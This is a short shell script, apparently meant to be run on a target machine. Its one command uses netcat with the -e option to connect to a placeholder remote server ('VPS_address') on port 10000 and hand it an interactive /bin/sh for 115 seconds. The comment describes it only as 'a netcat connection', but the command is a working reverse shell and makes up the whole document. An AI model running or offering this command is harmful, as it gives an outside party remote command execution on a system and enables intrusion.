# This script do a netcat connection and will end after 115 seconds
timeout -t 115 -s TERM nc VPS_address 10000 -e "/bin/sh"
